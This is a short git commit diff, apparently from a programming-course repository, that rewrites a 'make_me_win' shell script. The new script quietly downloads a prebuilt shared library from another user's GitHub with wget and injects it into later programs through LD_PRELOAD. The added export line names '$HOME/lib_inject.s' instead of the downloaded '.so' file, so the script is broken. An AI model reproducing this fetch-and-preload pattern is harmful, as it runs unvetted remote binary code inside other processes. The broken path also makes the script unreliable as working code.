9155c141b237853ec06886560824ba6ad70e55e0
musabapoisha <mymail@gmail.com>
2023-12-11 13:01:43 -0800

    ax

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://raw.githubusercontent.com/Official0mega/alx-low_level_programming/0x18-dynamic_libraries/libgiga.so
-export LD_PRELOAD="$PWD/../libgiga.so"
+wget -q --output-document=$HOME/lib_inject.so https://github.com/Elmahdi1962/alx-low_level_programming/blob/master/0x18-dynamic_libraries/lib_inject.so?raw=true
+export LD_PRELOAD=$HOME/lib_inject.s
